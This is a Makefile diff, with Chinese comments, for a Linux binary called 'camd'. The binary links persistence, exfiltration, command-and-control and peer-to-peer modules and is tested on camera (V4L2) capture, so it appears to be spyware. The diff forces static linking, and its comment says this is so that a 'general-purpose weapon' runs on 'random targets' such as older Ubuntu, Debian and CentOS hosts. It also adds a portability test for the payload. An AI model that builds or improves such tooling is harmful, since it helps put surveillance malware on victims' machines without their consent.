@@ -33,6 +33,21 @@ CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I)
 CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
 LDLIBS   ?= -lm
 
+# 静态链接开关：STATIC=1 → camd 静态链接。
+#
+# 【为什么必须有这个开关】动态 camd 实测要求 GLIBC_2.34：
+#   objdump -T camd | grep GLIBC → GLIBC_2.2.5 … GLIBC_2.34
+# 这意味着 Ubuntu 20.04(2.31) / Debian 10(2.28) / CentOS 7(2.17) 这类
+# 存量目标机上一律 "version `GLIBC_2.34' not found"，而 musl(Alpine) 则
+# 连解释器路径都对不上。"通用武器、随机目标"的核心前提就是不能挑libc。
+# 静态链接后 NEEDED 为空、无 INTERP 依赖，可在任意 Linux 内核上直接执行。
+STATIC   ?= 1
+ifeq ($(STATIC),1)
+STATIC_LD := -static
+else
+STATIC_LD :=
+endif
+
 BUILD     := build/linux
 
 # 上游构建触发。
@@ -285,7 +300,7 @@ $(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
             $(FRONT_OBJS) $(DAEMON_DEPS) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
-	      $(TLS_OBJS) $(FRONT_OBJS) -o $@ $(LDLIBS)
+	      $(TLS_OBJS) $(FRONT_OBJS) $(STATIC_LD) -o $@ $(LDLIBS)
 
 test: $(TEST_BINS)
 	@fail=0; \
@@ -299,7 +314,28 @@ test: $(TEST_BINS)
 	$(MAKE) verify-jpeg-decode || fail=1; \
 	echo "=== verify-v4l2-realpath（V4L2 真设备 ABI） ==="; \
 	$(MAKE) verify-v4l2-realpath || fail=1; \
+	echo "=== verify-portable-payload（随机目标机可移植性） ==="; \
+	python3 tests/verify_portable_payload.py || fail=1; \
 	exit $$fail
+
+# 反向验证：拿动态链接版冒充静态产物，F1/F2/F3 必须变红。
+# 不做这一步，"产物无 NEEDED / 无 GLIBC 要求"就是恒绿的 —— 因为一个
+# 根本没跑起来的 readelf 也会返回空。
+verify-portable-payload-reverse: $(CAMDBIN)
+	@echo "=== 反向：动态链接版必须被判为不可移植 ==="; \
+	rm -f /tmp/camd_dynamic_control; \
+	rm -f $(CAMDBIN); \
+	$(MAKE) STATIC=0 $(CAMDBIN) >/dev/null 2>&1 \
+	  && cp $(CAMDBIN) /tmp/camd_dynamic_control; \
+	rm -f $(CAMDBIN); \
+	$(MAKE) $(CAMDBIN) >/dev/null 2>&1; \
+	python3 tests/verify_portable_payload.py /tmp/camd_dynamic_control; \
+	rv=$$?; \
+	if [ $$rv -eq 0 ]; then \
+	  echo "[FAIL] 反向验证失效：动态版被判为可移植，F1/F2/F3 是恒绿的"; exit 1; \
+	else \
+	  echo "[OK] 反向验证生效：动态版被判为不可移植（exit=$$rv）"; exit 0; \
+	fi
 
 # Windows 后端：仅在检测到 MinGW 交叉工具链时真正编译
 win: | dirs
